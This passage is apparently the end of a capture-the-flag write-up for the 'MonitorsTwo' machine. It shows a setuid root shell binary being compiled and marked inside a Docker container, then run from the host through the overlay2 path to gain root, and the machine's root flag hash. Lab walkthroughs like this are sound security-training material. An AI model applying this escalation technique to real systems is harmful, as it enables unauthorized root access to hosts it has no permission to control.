shell.c:9:2: warning: implicit declaration of function 'system' [-Wimplicit-function-declaration]
    9 |  system ("/bin/bash", argv, envp);
      |  ^~~~~~
shell.c:10:1: warning: 'return' with no value, in function returning non-void
   10 | return;
      | ^~~~~~
shell.c:4:1: note: declared here
    4 | main( int argc, char ** argv, char ** envp )
      | ^~~~
```

```c
chmod +s shell
```

```c
ls -la
total 104
drwxr-xr-x   1 root root  4096 Apr 29 20:16 .
drwxr-xr-x   1 root root  4096 Apr 29 20:16 ..
-rwxr-xr-x   1 root root     0 Mar 21 10:49 .dockerenv
drwxr-xr-x   1 root root  4096 Mar 22 13:21 bin
drwxr-xr-x   2 root root  4096 Mar 22 13:21 boot
drwxr-xr-x   5 root root   340 Apr 29 19:04 dev
-rw-r--r--   1 root root   648 Jan  5 11:37 entrypoint.sh
drwxr-xr-x   1 root root  4096 Mar 21 10:49 etc
drwxr-xr-x   2 root root  4096 Mar 22 13:21 home
drwxr-xr-x   1 root root  4096 Nov 15 04:13 lib
drwxr-xr-x   2 root root  4096 Mar 22 13:21 lib64
drwxr-xr-x   2 root root  4096 Mar 22 13:21 media
drwxr-xr-x   2 root root  4096 Mar 22 13:21 mnt
drwxr-xr-x   2 root root  4096 Mar 22 13:21 opt
dr-xr-xr-x 279 root root     0 Apr 29 19:04 proc
drwx------   1 root root  4096 Mar 21 10:50 root
drwxr-xr-x   1 root root  4096 Apr 29 19:18 run
drwxr-xr-x   1 root root  4096 Jan  9 09:30 sbin
-rwsr-sr-x   1 root root 16712 Apr 29 20:16 shell
drwxr-xr-x   2 root root  4096 Mar 22 13:21 srv
dr-xr-xr-x  13 root root     0 Apr 29 19:04 sys
drwxrwxrwt   1 root root  4096 Apr 29 20:08 tmp
drwxr-xr-x   1 root root  4096 Nov 14 00:00 usr
drwxr-xr-x   1 root root  4096 Nov 15 04:13 var
```

```c
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ls -la
total 112
drwxr-xr-x 1 root root  4096 Apr 29 20:16 .
drwx-----x 5 root root  4096 Apr 29 19:04 ..
drwxr-xr-x 1 root root  4096 Mar 22 13:21 bin
drwxr-xr-x 2 root root  4096 Mar 22 13:21 boot
drwxr-xr-x 1 root root  4096 Mar 21 10:49 dev
-rwxr-xr-x 1 root root     0 Mar 21 10:49 .dockerenv
-rwxr-xr-x 1 root root     0 Jan  5 11:37 entrypoint.sh
drwxr-xr-x 1 root root  4096 Mar 21 10:49 etc
drwxr-xr-x 2 root root  4096 Mar 22 13:21 home
drwxr-xr-x 1 root root  4096 Nov 15 04:13 lib
drwxr-xr-x 2 root root  4096 Mar 22 13:21 lib64
drwxr-xr-x 2 root root  4096 Mar 22 13:21 media
drwxr-xr-x 2 root root  4096 Mar 22 13:21 mnt
drwxr-xr-x 2 root root  4096 Mar 22 13:21 opt
drwxr-xr-x 2 root root  4096 Mar 22 13:21 proc
drwx------ 1 root root  4096 Mar 21 10:50 root
drwxr-xr-x 1 root root  4096 Apr 29 19:18 run
drwxr-xr-x 1 root root  4096 Jan  9 09:30 sbin
-rwsr-sr-x 1 root root 16712 Apr 29 20:16 shell
drwxr-xr-x 2 root root  4096 Mar 22 13:21 srv
drwxr-xr-x 2 root root  4096 Mar 22 13:21 sys
drwxrwxrwt 1 root root  4096 Apr 29 20:08 tmp
drwxr-xr-x 1 root root  4096 Nov 14 00:00 usr
drwxr-xr-x 1 root root  4096 Nov 15 04:13 var
```

```c
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./shell
root@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged#
```

## root.txt

```c
root@monitorstwo:/root# cat root.txt
797e1ac698200c91aa14c7d8109c3263
```
